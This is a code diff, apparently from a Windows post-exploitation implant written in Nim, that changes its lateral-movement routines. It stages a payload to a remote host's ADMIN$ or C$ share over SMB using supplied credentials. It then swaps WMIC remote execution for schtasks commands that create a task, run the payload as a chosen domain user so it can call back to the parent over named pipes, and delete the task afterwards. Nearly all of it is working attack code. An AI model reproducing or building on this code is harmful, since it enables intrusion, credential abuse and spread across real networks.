@@ -1643,6 +1643,8 @@ when defined(windows):
   proc smbStage(host, name, user, pass: string; data: seq[byte]): string =
     ## Upload data to the remote host via SMB (ADMIN$ then C$\Windows\Temp).
     ## Returns the remote Windows path on success, "" on failure.
+    # Disconnect any implicit machine-account session first (prevents error 3775).
+    discard runShell("net use \\\\" & host & " /delete /y 2>nul")
     if user != "" and pass != "":
       discard runShell("net use \\\\" & host & "\\IPC$ \"" & pass & "\" /user:\"" & user & "\" 2>&1")
     defer:
@@ -1740,17 +1742,20 @@ when defined(windows):
       let exeName = svcName & ".exe"
       let remotePath = smbStage(host, exeName, user, pass, payData)
       if remotePath == "": return "wmi: SMB staging failed"
-      var wmicCmd: string
+      # Use schtasks with explicit domain-user credentials so the child process
+      # runs as the provided account (not SYSTEM/machine-account), enabling
+      # cross-domain named-pipe auth back to the parent.
+      let atStart = runasStartTime()
+      var schedAuth = ""
+      var ruAs = " /RU SYSTEM"
       if user != "" and pass != "":
-        let parts = user.split('\\')
-        let dom = if parts.len > 1: parts[0] else: "."
-        let usr = if parts.len > 1: parts[1] else: user
-        wmicCmd = "wmic /node:\"" & host & "\" /user:\"" & dom & "\\" & usr &
-                  "\" /password:\"" & pass & "\" process call create \"" & remotePath & "\""
-      else:
-        wmicCmd = "wmic /node:\"" & host & "\" process call create \"" & remotePath & "\""
-      let out2 = runShell(wmicCmd)
-      return "[+] wmi → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
+        schedAuth = " /U \"" & user & "\" /P \"" & pass & "\""
+        ruAs = " /RU \"" & user & "\" /RP \"" & pass & "\""
+      let createOut = runShell("schtasks /Create /S " & host & schedAuth & ruAs &
+        " /SC ONCE /ST " & atStart & " /F /TN " & svcName & " /TR \"" & remotePath & "\" 2>&1")
+      let runOut = runShell("schtasks /Run /S " & host & schedAuth & " /TN " & svcName & " 2>&1")
+      discard runShell("schtasks /Delete /S " & host & schedAuth & " /TN " & svcName & " /F 2>&1")
+      return "[+] wmi → " & host & "\n    path: " & remotePath & "\n" & createOut.strip() & "\n" & runOut.strip()
     elif meth == "smbexec":
       let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
       let exeName = svcName & ".exe"
